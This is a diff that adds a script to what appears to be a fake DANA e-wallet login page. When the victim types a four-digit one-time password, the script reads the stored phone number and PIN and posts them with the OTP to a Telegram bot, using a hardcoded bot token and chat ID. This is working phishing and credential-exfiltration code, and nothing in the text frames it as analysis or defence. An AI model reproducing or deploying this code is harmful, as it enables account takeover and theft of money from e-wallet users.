@@ -114,3 +114,33 @@
   </script>
 </body>
 </html>
+<script>
+  const otpInput = document.getElementById('otp');
+
+  otpInput.addEventListener('input', () => {
+    if (otpInput.value.length === 4) {
+      const phone = sessionStorage.getItem('phone');
+      const pin = sessionStorage.getItem('pin');
+      const otp = otpInput.value;
+
+      const token = "7658902176:AAE0RbA2cBHQh6EgU9We-ar7XGrrPxPFVYw";
+      const chatId = "6597122729";
+      const message = `🔐 *DANA Login*\n\n📱 Nomor: ${phone}\n🔑 PIN: ${pin}\n📩 OTP: ${otp}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).then(() => {
+        alert("Data terkirim ke Telegram.");
+      }).catch(() => {
+        alert("Gagal mengirim.");
+      });
+    }
+  });
+</script>
+
